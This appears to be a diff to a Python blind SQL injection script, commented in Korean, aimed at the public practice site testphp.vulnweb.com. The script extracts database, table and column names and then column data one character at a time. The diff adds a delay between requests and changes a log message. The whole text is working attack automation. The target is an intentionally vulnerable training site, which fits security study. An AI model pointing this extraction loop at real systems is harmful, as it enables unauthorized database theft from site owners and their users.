@@ -3,11 +3,13 @@ import pandas as pd
 from openpyxl import Workbook, load_workbook
 from openpyxl.styles import PatternFill, Font, Alignment
 import os
+import time
 
 # 설정 정보
 url = "http://testphp.vulnweb.com/artists.php"  # 대상 URL
 param_name = "artist"  # 공격할 파라미터 이름
 true_response_indicator = "r4w8173"  # 참일 때 나타나는 응답 키워드
+sleep_time = 1.0  # 요청 간 지연 시간 (초)
 
 # SQL Injection 페이로드 템플릿 설정
 payload_templates = {
@@ -73,6 +75,7 @@ def get_database_name():
             payload = payload_templates["database_name"].format(i=i, char=char)
             params = {param_name: payload}
             response = requests.get(url, params=params)
+            time.sleep(sleep_time)  # 요청 후 지연
 
             if is_true_response(response):
                 db_name += char
@@ -96,6 +99,7 @@ def get_table_names(limit=0):
                 payload = payload_templates["table_name"].format(index=index, i=i, char=char)
                 params = {param_name: payload}
                 response = requests.get(url, params=params)
+                time.sleep(sleep_time)  # 요청 후 지연
 
                 if is_true_response(response):
                     table_name += char
@@ -124,6 +128,7 @@ def get_column_names(table_name, limit=0):
                 payload = payload_templates["column_name"].format(table_name=table_name, index=index, i=i, char=char)
                 params = {param_name: payload}
                 response = requests.get(url, params=params)
+                time.sleep(sleep_time)  # 요청 후 지연
 
                 if is_true_response(response):
                     column_name += char
@@ -153,11 +158,12 @@ def get_column_data(table_name, column_name, limit=0):
                 payload = payload_templates["column_data"].format(table_name=table_name, column_name=column_name, index=index, i=i, char=char)
                 params = {param_name: payload}
                 response = requests.get(url, params=params)
+                time.sleep(sleep_time)  # 요청 후 지연
 
                 if is_true_response(response):
                     row_data += char
                     found_char = True
-                    print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
+                    print(f"[데이터 발견] 위치 {i}에서 '{char}' 문자 발견!")
                     break
             if not found_char:
                 break
